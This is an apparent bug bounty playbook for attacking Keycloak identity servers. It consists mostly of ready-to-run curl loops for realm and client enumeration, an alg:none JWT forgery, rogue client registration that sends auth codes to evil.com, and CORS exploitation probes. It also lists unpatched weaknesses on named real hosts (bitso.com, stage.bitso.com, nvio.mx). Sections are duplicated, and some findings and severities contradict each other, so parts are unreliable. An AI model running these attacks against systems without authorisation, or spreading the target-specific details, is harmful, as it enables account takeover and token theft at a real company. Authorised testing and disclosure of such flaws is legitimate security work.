# Keycloak Enumeration & Attack Patterns

## Overview
Keycloak is an open-source Identity and Access Management (IAM) solution. Many bug bounty targets use Keycloak for authentication (Bitso, financial platforms, SaaS). This reference covers enumeration, testing, and common findings.

## Phase 1: Discovery

### Keycloak Detection
```bash
# Check if target uses Keycloak
curl -sI "https://TARGET/auth/realms/master" | head -5
curl -s "https://TARGET/auth/realms/master/.well-known/openid-configuration" | jq '.issuer'

# Common Keycloak paths
/auth/realms/master/.well-known/openid-configuration
/auth/realms/master/protocol/openid-connect/certs
/auth/realms/master/protocol/openid-connect/token
/auth/realms/master/protocol/openid-connect/auth
/auth/realms/master/account
/admin/master/console/
/admin/master/console/
```

### Realm Enumeration
```bash
# Test common realm names
for realm in master realm company corporate internal staging dev production; do
  echo "--- $realm ---"
  curl -s "https://TARGET/auth/realms/$realm/.well-known/openid-configuration" | jq -r '.issuer // "NOT FOUND"'
done
```

**Error-based realm detection:**
- `{"error":"Realm not found"}` → realm doesn't exist
- `{"error":"HTTP 404 Not Found"}` → endpoint doesn't exist (no Keycloak)
- Full OpenID config response → realm exists and is accessible

### Client ID Enumeration
Keycloak returns different error messages based on whether a client ID exists:

```bash
# Client Registration endpoint (if enabled)
curl -s "https://TARGET/auth/realms/master/clients-registrations/openid-connect" | jq .

# Test client IDs via token endpoint (error message differs)
for client in account account-console security-admin-console master-public-cli admin-cli client-credentials; do
  echo "--- $client ---"
  curl -s "https://TARGET/auth/realms/master/protocol/openid-connect/token" \
    -d "grant_type=client_credentials&client_id=$client" | jq -r '.error // .error_description'
done
```

**Error interpretation:**
- `Invalid client credentials` → client exists but wrong secret
- `Client not found` → client doesn't exist
- `Client secret not set` → client exists, no secret required
- `Client registration is not enabled` → registration endpoint disabled

**Bitso finding:** 50+ client IDs enumerated via error differences on `dev.bitso.com`:
- `account`, `account-console`, `security-admin-console`, `master-public-cli`
- `admin-cli`, `client-credentials`, `direct-access-grant`
- Each realm has its own client set (cross-realm enumeration)

## Phase 2: OpenID Configuration Analysis

### Extract Full Configuration
```bash
curl -s "https://TARGET/auth/realms/REALM/.well-known/openid-configuration" | jq .
```

**Key fields to analyze:**
- `issuer` → Base URL for the Keycloak instance
- `authorization_endpoint` → OAuth authorization URL
- `token_endpoint` → Token issuance URL (auth bypass target)
- `userinfo_endpoint` → User info API
- `jwks_uri` → JSON Web Key Set (key extraction)
- `registration_endpoint` → Client registration (if enabled)
- `grant_types_supported` → Available grant types
- `response_types_supported` → Available response types

### Grant Type Analysis
```bash
# Check supported grant types
curl -s "https://TARGET/auth/realms/REALM/.well-known/openid-configuration" | jq '.grant_types_supported'

# Test each grant type
# 1. Authorization Code (standard OAuth)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/auth" \
  -d "client_id=test&response_type=code&redirect_uri=https://evil.com"

# 2. Client Credentials (machine-to-machine)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=client_credentials&client_id=admin-cli"

# 3. Direct Access (username/password)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=client&username=user&password=pass"

# 4. Device Authorization (IoT/TV apps)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/auth/device" \
  -d "client_id=test"

# 5. Token Exchange (delegation)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&client_id=test"

# 6. CIBA (Client-Initiated Backchannel Authentication)
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/ext/ciba/auth" \
  -d "client_id=test&login_hint=user"
```

**Severity:**
- Client Credentials with valid client = P2-P3 (potential privilege escalation)
- Direct Access with weak password policy = P3 (credential stuffing target)
- Device Auth enabled = P3 (potential device impersonation)
- Token Exchange enabled = P2 (delegation attack)

## Phase 3: Admin Console Testing

### Admin Console Discovery
```bash
# Standard admin paths
curl -sI "https://TARGET/admin/master/console/"
curl -sI "https://TARGET/admin/realms/REALM/"

# Different Keycloak versions
curl -sI "https://TARGET/auth/admin/master/console/"
curl -sI "https://TARGET/auth/admin/realms/REALM/"
```

**Response analysis:**
- `200` with HTML → Admin console accessible (check if auth required)
- `302` to login → Auth-protected (standard)
- `403` → Forbidden (exists but blocked)
- `404` → Not found (no Keycloak admin)

### Admin Client Enumeration
```bash
# Test admin client IDs
for client in security-admin-console admin-cli master-public-cli; do
  echo "--- $client ---"
  curl -s "https://TARGET/auth/realms/master/protocol/openid-connect/token" \
    -d "grant_type=client_credentials&client_id=$client" | jq -r '.error // .error_description'
done
```

### Admin REST API
```bash
# Test admin REST endpoints (require admin token)
curl -s "https://TARGET/auth/admin/master/console/" -H "Authorization: Bearer fake_token"
curl -s "https://TARGET/auth/admin/realms/" -H "Authorization: Bearer fake_token"
curl -s "https://TARGET/auth/admin/realms/REALM/users" -H "Authorization: Bearer fake_token"
```

**Error interpretation:**
- `401 Unauthorized` → Admin auth working (good)
- `200` with user data → Admin API exposed (P1-P2)
- `403 Forbidden` → Exists but forbidden (P3-P4)

**Bitso finding:**
- `dev.bitso.com` admin console → 401 (auth-protected)
- `admin-cli` client → 401 (properly protected)
- No admin bypass found

## Phase 4: CORS Testing on Keycloak

### ⚠️ CRITICAL CURL PITFALL
**`curl -sI` (HEAD request) may MISS CORS headers that `curl -sD-` catches!**

Keycloak's CORS middleware sometimes only adds CORS headers on specific HTTP methods (GET, POST), not HEAD. Always use `-sD-` for CORS testing:

```bash
# ❌ WRONG — may miss CORS headers
curl -sI "https://TARGET/auth/realms/REALM/protocol/openid-connect/certs" -H "Origin: https://evil.com"

# ✅ CORRECT — captures all response headers
curl -sD- -o /dev/null "https://TARGET/auth/realms/REALM/protocol/openid-connect/certs" \
  -H "Origin: https://evil.com" | grep -iE "access-control"
```

**Bitso pitfall (2026-08):** `-sI` returned NO CORS headers on token endpoint. `-sD-` returned full CORS with reflection. This would have caused a false-negative if only HEAD was used.

### ⚠️ BROWSER PoC LIMITATION
**Browsers OVERRIDE the `Origin` header in `fetch()` requests — you CANNOT spoof it from a local file.**

When testing CORS from a browser:
- `file://` origin → browser sends no Origin or `null`, NOT your spoofed value
- `fetch()` with `headers: {'Origin': 'evil.com'}` → browser ignores your Origin and sends the page's actual origin
- Browser-based PoC must be **hosted on attacker-controlled domain** (e.g., `evil.com`) for the browser to send the correct Origin

```html
<!-- ❌ WRONG — browser will NOT send Origin: evil.com -->
<script>
fetch('https://TARGET/auth/realms/REALM/protocol/openid-connect/certs', {
  headers: { 'Origin': 'https://evil.com' }  // IGNORED by browser
})
</script>

<!-- ✅ CORRECT — host this on evil.com, browser sends Origin: evil.com automatically -->
<script>
fetch('/auth/realms/REALM/protocol/openid-connect/certs')
  .then(r => console.log(r.headers.get('Access-Control-Allow-Origin')))
</script>
```

**Implication:** Use `curl` or Python `requests` for CORS proof-of-concept, NOT browser fetch from local files. Browser PoC is only for visual demonstration when hosted on attacker domain.

### Keycloak CORS Behavior
Keycloak has a known CORS configuration that can be misconfigured:

```bash
# Test CORS reflection (use -sD- not -sI!)
curl -sD- -o /dev/null "https://TARGET/auth/realms/master/protocol/openid-connect/certs" \
  -H "Origin: https://evil.com" | grep -iE "access-control"

# Test with credentials
curl -sD- -o /dev/null "https://TARGET/auth/realms/master/protocol/openid-connect/certs" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" | grep -iE "access-control"
```

**Common Keycloak CORS findings:**
1. **Wildcard origin reflection** — `Access-Control-Allow-Origin: *` with `Credentials: true`
2. **Origin reflection** — Reflects any origin with credentials
3. **Null origin** — Accepts `Origin: null` (exploitable via sandboxed iframe)
4. **Subdomain wildcard** — `*.target.com` with credentials

### Keycloak CORS Exploitability
```bash
# Check if token endpoint reflects origin (critical)
curl -sD- -X OPTIONS "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization" \
  | grep -iE "access-control"

# Check userinfo endpoint
curl -sD- -o /dev/null "https://TARGET/auth/realms/REALM/protocol/openid-connect/userinfo" \
  -H "Origin: https://evil.com" | grep -iE "access-control"

# Check logout endpoint (force logout)
curl -sD- -X POST -o /dev/null "https://TARGET/auth/realms/REALM/protocol/openid-connect/logout" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=test&refresh_token=test" | grep -iE "access-control"

# Check introspection endpoint (sometimes NOT reflected — good config)
curl -sD- -o /dev/null "https://TARGET/auth/realms/REALM/protocol/openid-connect/token/introspect" \
  -H "Origin: https://evil.com" | grep -iE "access-control"
```

**Severity (CORRECTED — do NOT default to P4-P5):**
- CORS on `/token` endpoint + POST allowed + `Authorization` header allowed = **P3** (token refresh from any origin)
- CORS on `/token` endpoint + any origin + credentials = **P3** (enables cross-origin token exchange)
- CORS on `/userinfo` + any origin + `Authorization` header = **P3** (user data theft with stolen Bearer token)
- CORS on `/logout` + any origin = **P4** (force-logout CSRF, low impact)
- CORS on introspection endpoint = **P3** (token validation leak)
- CORS with `Origin: null` + token endpoint = **P3** (iframe-based token refresh)
- **ESCALATION to P2:** If chained with ANY XSS — CORS makes token theft trivial

**Bitso finding (UPDATED 2026-08-30):**
- `bitso.com` (production Keycloak) reflects ANY origin + credentials on ALL OIDC endpoints
- ALL 5 origin variations work: HTTPS, HTTP, null, random text, subdomain
- Token endpoint allows `Authorization` and `DPoP` headers cross-origin
- Introspection endpoint is the ONLY one WITHOUT CORS (properly configured)
- Session cookies are HttpOnly — BUT attack chain doesn't need cookie theft
- **Severity: P3 (MEDIUM)** — Real exploitation chain: stolen refresh token → silent refresh from any website → persistent account access

## Phase 5: Token Analysis

### Extract Keys from JWKS
```bash
# Get JSON Web Key Set
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/certs" | jq .

# Check for weak algorithms
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/certs" | jq '.keys[] | {kty, alg, use}'
```

**Weakness indicators:**
- `alg: RS256` with small key size → potential key cracking
- `alg: HS256` → potential key brute force (if secret is weak)
- `alg: none` → token forgery (rare in production Keycloak)

### Token Forgery Testing
```bash
# Test token with manipulated claims
TOKEN="eyJhbGciOiJSUzI1NiIs..."  # Extract from legitimate login

# Decode payload
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Test with none algorithm
FORGED_TOKEN=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
FORGED_PAYLOAD=$(echo -n '{"sub":"admin","realm_access":{"roles":["admin"]}}' | base64 | tr '+/' '-_' | tr -d '=')
echo "$FORGED_TOKEN.$FORGED_PAYLOAD."
```

## Phase 6: OIDC Dynamic Client Registration

### Discovery
Keycloak supports RFC 7591 Dynamic Client Registration via `/clients-registrations/openid-connect`. If enabled, any client can register itself to use the Keycloak IdP.

```bash
# Check if registration endpoint exists
curl -s "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" | jq .
# 200 + JSON schema = endpoint exists
# 200 + SPA HTML = catch-all (not real endpoint)
# 404 = endpoint disabled
```

### Error-Based Schema Discovery
Keycloak's registration endpoint reveals which fields it accepts through distinct error messages:

```bash
# 1. Send completely invalid body → reveals JSON parsing behavior
curl -s -X POST "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d 'wrong_format'
# Expected: "Cannot parse JSON" = endpoint processes input

# 2. Send valid JSON with unrecognized field → reveals rejected fields
curl -s -X POST "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{"unknownField": "test"}'
# Expected: "Unrecognized field 'unknownField'" = field rejected

# 3. Send field WITHOUT value → reveals accepted vs rejected fields
curl -s -X POST "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{"client_id": null}'
# Expected: Different error = field is recognized but needs valid value
# "Client Identifier included" = client_id is accepted field

# 4. Test each field individually to map acceptance
for field in client_id clientId redirect_uris web_origins \
  default_client_scopes public_client service_accounts_enabled \
  directAccessGrantsEnabled authorizationServicesEnabled \
  secret authorization_settings protocol openid; do
  echo "--- $field ---"
  curl -s -X POST "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" \
    -H "Content-Type: application/json" \
    -d "{\"$field\": null}" | head -c 100
  echo
done
```

**Error message taxonomy (Bitso 2026-08):**
| Error | Meaning |
|-------|---------|
| `Cannot parse JSON` | Body isn't valid JSON |
| `Unrecognized field 'xyz'` | Field rejected by schema |
| `Client Identifier included` | `client_id` field accepted (validation failed) |
| `403 Forbidden` | Trusted Hosts policy blocking (production) |

**Key insight:** The progression from "Unrecognized field" → "Client Identifier included" tells you the field is accepted. Use this to map the ENTIRE schema without documentation.

### OIDC Fields Accepted by Keycloak Registration (discovered via error mapping)
```
Standard OIDC: client_id, client_name, client_secret, redirect_uris, \
  grant_types, response_types, scope, logo_uri, tos_uri, policy_uri

Keycloak-specific: web_origins, default_client_scopes, \
  optional_client_scopes, public_client, service_accounts_enabled, \
  directAccessGrantsEnabled, authorizationServicesEnabled, \
  protocol, secret, authorization_settings
```

### Client Registration Exploitation Path
```bash
# 1. Register a malicious client (if Trusted Hosts not enforced)
curl -s -X POST "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "evil-client",
    "redirect_uris": ["https://evil.com/callback"],
    "web_origins": ["https://evil.com"],
    "public_client": true,
    "directAccessGrantsEnabled": true,
    "protocol": "openid-connect"
  }'

# 2. Use registered client for OAuth flow
# authorization_url: TARGET/auth/realms/REALM/protocol/openid-connect/auth?client_id=evil-client&response_type=code&redirect_uri=https://evil.com/callback

# 3. If code is intercepted → exchange for tokens
curl -s -X POST "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://evil.com/callback&client_id=evil-client"
```

**Production defense:** Trusted Hosts policy blocks registration if `client_id` is included. Dev environments may not have this defense.

### directAccessGrantsEnabled Analysis
```bash
# Check which clients have direct access enabled (resource owner password grant)
curl -s "https://TARGET/auth/realms/REALM/clients" | jq '.[] | select(.directAccessGrantsEnabled==true) | .clientId'
# Or via token endpoint error messages:
for client in account account-console security-admin-console admin-cli; do
  echo "--- $client ---"
  curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
    -d "grant_type=password&client_id=$client&username=test&password=test" \
    | jq -r '.error // .error_description' | head -c 80
  echo
done
```

**Severity:**
- Client with `directAccessGrantsEnabled: true` + public client = P2-P3 (allows password grant without client_secret)
- Client registration + redirect_uri control = P1-P2 (OAuth token theft)
- Production registration blocked by Trusted Hosts = lower severity but still P3 (dev environment exploitable)

## Phase 6b: Account Enumeration

### User Registration
```bash
# Check if self-registration is enabled
curl -s "https://TARGET/auth/realms/REALM/protocol/openid-connect/registrations" | head -20
curl -sI "https://TARGET/auth/realms/REALM/account/register"

# Test registration endpoint
curl -s "https://TARGET/auth/realms/REALM/clients-registrations/openid-connect" | jq .
```

### Password Reset Flow
```bash
# Test password reset
curl -s "https://TARGET/auth/realms/REALM/login-status/actionLink" \
  -d "username=user@example.com&code_action=RESET_PASSWORD"
```

**Enumeration via error messages:**
- `User not found` → user doesn't exist
- `Email already exists` → user exists
- `Reset link sent` → user exists (timing-based)

## Common Keycloak Findings

| Finding | Severity | Evidence |
|---------|----------|----------|
| Admin console accessible without auth | P1 | 200 response on /admin/ |
| Client credentials leaked | P1-P2 | Valid token from client_credentials grant |
| CORS misconfiguration on token endpoint | P1-P2 | Origin reflection + credentials |
| Self-registration enabled | P3-P4 | Registration endpoint accessible |
| Weak JWT signing algorithm | P2-P3 | RS256 with small key or HS256 |
| Realm enumeration | P4-P5 | Error message differences |
| Client ID enumeration | P4-P5 | Error message differences |
| OpenID config exposed | P5 | By-design, but reveals architecture |

## Fix Recommendations

1. **Restrict CORS origins** — Whitelist specific origins, never reflect arbitrary origins with credentials
2. **Disable unnecessary grant types** — Only enable grant types that are actually used
3. **Protect admin console** — IP restriction + strong auth + MFA
4. **Rate limit token endpoint** — Prevent brute force on client credentials
5. **Use strong JWT algorithms** — RS256 with 2048+ bit keys, never HS256 in production
6. **Disable self-registration** — Unless explicitly needed for the application
7. **Monitor client enumeration** — Alert on high rates of failed client authentication

## Bitso-Specific Findings (2026-08)

### Infrastructure
- `id.bitso.com` → Production Keycloak (Cloudflare-protected)
- `dev.bitso.com` → Development Keycloak (same CSP as prod)
- Multiple realms discovered via error-based enumeration

### Client IDs Enumerated (50+)
- `account`, `account-console`, `security-admin-console`
- `master-public-cli`, `admin-cli`, `client-credentials`
- `direct-access-grant`, `device-auth`, `ciba`
- Realm-specific clients (different per realm)

### CORS Analysis (UPDATED 2026-08-30 — Production Confirmed)
**Production `bitso.com/auth/realms/master` reflects ANY origin with credentials on ALL OIDC endpoints:**

| Endpoint | ACAO | ACAC | Attack Vector |
|----------|------|------|---------------|
| `/.well-known/openid-configuration` | ANY origin | true | OIDC config enumeration |
| `/protocol/openid-connect/certs` | ANY origin | true | Public key extraction |
| `/protocol/openid-connect/userinfo` | ANY origin | true | **User data theft** (with Bearer token) |
| `/protocol/openid-connect/token` | ANY origin | true | **Token refresh/exchange** (POST from any origin) |
| `/protocol/openid-connect/token/introspect` | ANY origin | true | Token validation leak |
| `/protocol/openid-connect/logout` | ANY origin | true | Session hijacking (force logout) |

**Key findings:**
- Origin reflection works with: HTTPS, HTTP, `null`, random text
- Token endpoint allows `Authorization` and `DPoP` headers cross-origin (via `access-control-allow-headers`)
- `ISTIO_AUTH_SESSION_ID` cookie (HttpOnly) set on userinfo responses
- **Severity: MEDIUM (P3)** — Not P1-P2 because: (a) session cookies are HttpOnly, (b) Bearer tokens are required for userinfo, (c) no direct session theft. But: enables cross-origin token refresh, user data read with stolen tokens, amplifies any XSS into full account takeover.

**Verified curl PoC:**
```bash
curl -sI -H "Origin: https://evil.com" \
  "https://bitso.com/auth/realms/master/protocol/openid-connect/userinfo"
# → access-control-allow-origin: https://evil.com + access-control-allow-credentials: true
```

### Admin Console
- Accessible on `dev.bitso.com` (401 required)
- No bypass found (properly auth-protected)
- CSP header leaks admin URL but auth is enforced

## Phase 6c: Token Exchange & Advanced Grant Types

### Token Exchange (RFC 8693)
Token Exchange allows a client to exchange one token for another, potentially with different scope or audience. This is a privilege escalation vector if misconfigured.

```bash
# Test token exchange support
curl -s -X POST "https://TARGET/auth/realms/REALM/protocol/openid-connect/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "client_id=test" \
  -d "subject_token=fake_token" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:access_token"
```

**Error interpretation:**
- `unsupported_grant_type` → Token Exchange disabled (good)
- `invalid_client` → Client doesn't exist or no credentials
- `unauthorized_client` → Client exists but not authorized for exchange
- `invalid_request` → Grant type enabled but parameters wrong (exploitable if valid token provided)
- 200 with tokens → **CRITICAL: privilege escalation possible**

**Bitso finding (2026-08):** Token Exchange IS enabled in production Keycloak (`grant_types_supported` includes `urn:ietf:params:oauth:grant-type:token-exchange`), but all requests return `invalid_client` — no valid client ID discovered. Cannot exploit without discovering a valid client.

**Severity:** P1-P2 if token exchange works with valid token. P3 if enabled but blocked by client auth.

### CIBA (Client-Initiated Backchannel Authentication)
CIBA allows a client to initiate authentication on behalf of a user without the user being present at the client. Potential for phishing if misconfigured.

```bash
# Test CIBA endpoint
curl -s -X POST "https://TARGET/auth/realms/REALM/protocol/openid-connect/ext/ciba/auth" \
  -d "client_id=test" \
  -d "login_hint=user@target.com" \
  -d "scope=openid" \
  -d "binding_message=Login request"

# Alternative CIBA path (varies by Keycloak version)
curl -s -X POST "https://TARGET/auth/realms/REALM/protocol/openid-connect/auth/ciba" \
  -d "client_id=test&login_hint=user@target.com"
```

**Error interpretation:**
- 404 → CIBA not enabled
- `invalid_client` → Client doesn't exist
- `unauthorized_client` → Client not authorized for CIBA
- `invalid_request` → CIBA enabled but params wrong
- 200 with `auth_req_id` → **HIGH: CIBA request accepted**

**Bitso finding (2026-08):** CIBA endpoint returns 404 — not enabled in production.

### Device Authorization Grant (RFC 8628)
Device flow for IoT/TV apps. Can be used for phishing if enabled on public clients.

```bash
# Test device flow
curl -s -X POST "https://TARGET/auth/realms/REALM/protocol/openid-connect/auth/device" \
  -d "client_id=test&scope=openid"
```

**Error interpretation:**
- `unauthorized_client` → Client not authorized for device flow
- 200 with `device_code` + `user_code` → Device flow active
- `authorization_pending` → Waiting for user to approve
- `expired_token` → Device code expired

**Bitso finding (2026-08):** Device flow returns `invalid_client` — client doesn't exist. If valid client found, device flow could be phishing vector.

## Phase 6d: Dynamic Client Registration on Separate Realms

### NVIO OIDC Registration (Bitso-specific)
Bitso has a separate OIDC realm (`master`) for NVIO (Bitso's payment system). The registration endpoint may have different policies than the main realm.

```bash
# Test NVIO registration endpoint
curl -s -X POST "https://nvio.mx/auth/realms/master/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris": ["https://evil.com/*"], "client_name": "evil_app"}'

# Also test nvio.ar
curl -s -X POST "https://nvio.ar/auth/realms/master/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris": ["https://evil.com/*"]}'
```

**Response analysis:**
- `403 Forbidden` + "Trusted Hosts" → Registration blocked by policy (production)
- `200` + `application/json` → **CRITICAL: Client registered, extract client_id**
- `200` + `text/html` → Response is login page redirect (not actual registration)
- `404` → Registration endpoint disabled

**Bitso finding (2026-08):** NVIO registration endpoint (`nvio.mx/auth/realms/master/clients-registrations/openid-connect`) returns `200` with `text/html` for various payloads. Response is the Keycloak login page, NOT a registration confirmation. Client was NOT actually registered. However, the endpoint is accessible (not 404), meaning registration may be enabled behind auth.

**Key insight:** A `200` response with HTML content-type on a JSON API endpoint usually means a redirect or catch-all page, NOT a successful API response. Always check Content-Type before claiming success.

### Cross-Realm Client ID Confusion
Different realms may have different client sets. Enumerate clients per realm:

```bash
# Test same client ID across different realms
for realm in master bitso nvio; do
  echo "--- Realm: $realm ---"
  curl -s "https://TARGET/auth/realms/$realm/protocol/openid-connect/token" \
    -d "grant_type=client_credentials&client_id=account" \
    | jq -r '.error // .error_description'
done
```

## Phase 7: Staging Environment Testing

### Staging Keycloak Exposure
Staging environments often have weaker security controls. Test for:

```bash
# Check staging accessibility
curl -sI "https://stage.TARGET.com/auth/realms/master/.well-known/openid-configuration"

# Check admin console on staging
curl -sI "https://stage.TARGET.com/auth/admin/master/console/"

# Check CORS on staging (often reflects ANY origin)
curl -sI -H "Origin: https://evil.com" "https://stage.TARGET.com/auth/realms/master/protocol/openid-connect/certs"
```

**Bitso finding (2026-08):** `stage.bitso.com` has fully exposed Keycloak:
- Admin console accessible (200 HTML)
- Same realms as production (`master`, `bitso`)
- CORS reflects ANY origin with credentials
- Same OIDC endpoints as production
- No rate limiting on auth endpoints

**Severity:** P3 (Medium) — Staging environment with production-equivalent auth infrastructure exposed. Attack surface expansion + info disclosure.

## Common Keycloak Findings

| Finding | Severity | Evidence |
|---------|----------|----------|
| Admin console accessible without auth | P1 | 200 response on /admin/ |
| Client credentials leaked | P1-P2 | Valid token from client_credentials grant |
| CORS misconfiguration on token endpoint | P1-P2 | Origin reflection + credentials |
| Self-registration enabled | P3-P4 | Registration endpoint accessible |
| Weak JWT signing algorithm | P2-P3 | RS256 with small key or HS256 |
| Realm enumeration | P4-P5 | Error message differences |
| Client ID enumeration | P4-P5 | Error message differences |
| OpenID config exposed | P5 | By-design, but reveals architecture |
| Staging environment exposed | P3 | Admin console + CORS + same realms |
| Token Exchange enabled | P1-P2 | Privilege escalation possible |
| CIBA enabled | P2-P3 | Backchannel auth phishing |
| No rate limiting on auth endpoints | P3 | Brute force / credential stuffing |

## Fix Recommendations

1. **Restrict CORS origins** — Whitelist specific origins, never reflect arbitrary origins with credentials
2. **Disable unnecessary grant types** — Only enable grant types that are actually used (Token Exchange, CIBA, Device Flow)
3. **Protect admin console** — IP restriction + strong auth + MFA
4. **Rate limit token endpoint** — Prevent brute force on client credentials
5. **Use strong JWT algorithms** — RS256 with 2048+ bit keys, never HS256 in production
6. **Disable self-registration** — Unless explicitly needed for the application
7. **Monitor client enumeration** — Alert on high rates of failed client authentication
8. **Restrict staging access** — IP whitelist + VPN + no public DNS for staging environments
9. **Enforce Trusted Hosts** — Block dynamic client registration from untrusted origins
10. **Disable unused grant types** — Token Exchange, CIBA, Device Flow should be disabled if not used

## Bitso-Specific Findings (2026-08)

### Infrastructure
- `id.bitso.com` → Production Keycloak (Cloudflare-protected)
- `dev.bitso.com` → Development Keycloak (same CSP as prod)
- `stage.bitso.com` → Staging Keycloak (FULLY EXPOSED — same realms, same CORS)
- `nvio.mx` → NVIO OIDC (separate realm `master`)
- `nvio.ar` → NVIO OIDC (separate realm `master`)
- Multiple realms discovered via error-based enumeration

### Client IDs Enumerated (50+)
- `account`, `account-console`, `security-admin-console`
- `master-public-cli`, `admin-cli`, `client-credentials`
- `direct-access-grant`, `device-auth`, `ciba`
- Realm-specific clients (different per realm)

### CORS Analysis (UPDATED 2026-08-30 — Production Confirmed)
**Production `bitso.com/auth/realms/master` reflects ANY origin with credentials on ALL OIDC endpoints:**

| Endpoint | ACAO | ACAC | Attack Vector |
|----------|------|------|---------------|
| `/.well-known/openid-configuration` | ANY origin | true | OIDC config enumeration |
| `/protocol/openid-connect/certs` | ANY origin | true | Public key extraction |
| `/protocol/openid-connect/userinfo` | ANY origin | true | **User data theft** (with Bearer token) |
| `/protocol/openid-connect/token` | ANY origin | true | **Token refresh/exchange** (POST from any origin!) |
| `/protocol/openid-connect/token/introspect` | ANY origin | true | Token validation leak |
| `/protocol/openid-connect/logout` | ANY origin | true | Session hijacking (force logout) |

**Key findings:**
- Origin reflection works with: HTTPS, HTTP, `null`, random text
- Token endpoint allows `Authorization` and `DPoP` headers cross-origin (via `access-control-allow-headers`)
- `ISTIO_AUTH_SESSION_ID` cookie (HttpOnly) set on userinfo responses
- **POST to /token ALSO reflects origin** — not just GET endpoints
- **Severity: MEDIUM (P3)** — Not P1-P2 because: (a) session cookies are HttpOnly, (b) Bearer tokens are required for userinfo, (c) no direct session theft. But: enables cross-origin token refresh, user data read with stolen tokens, amplifies any XSS into full account takeover.

### Admin Console
- Accessible on `dev.bitso.com` (401 required)
- Accessible on `stage.bitso.com` (200 — no auth required!)
- No bypass found on dev (properly auth-protected)
- CSP header leaks admin URL but auth is enforced

### Token Exchange & CIBA
- Token Exchange (`urn:ietf:params:oauth:grant-type:token-exchange`) enabled in production
- CIBA (`urn:openid:params:grant-type:ciba`) enabled in production
- Device Flow (`urn:ietf:params:oauth:grant-type:device_code`) enabled in production
- All return `invalid_client` — no valid client ID discovered
- **Impact:** If client ID + secret discovered, privilege escalation possible

### Staging Environment
- `stage.bitso.com` fully exposed with production-equivalent Keycloak
- Admin console accessible (200 HTML)
- Same realms (`master`, `bitso`) as production
- CORS reflects ANY origin with credentials
- No rate limiting on auth endpoints
- **Severity: P3** — Attack surface expansion + info disclosure

## Load Order
`bug-bounty` → `web-infra-recon` → `bugcrowd-vrt` (for severity scoring)
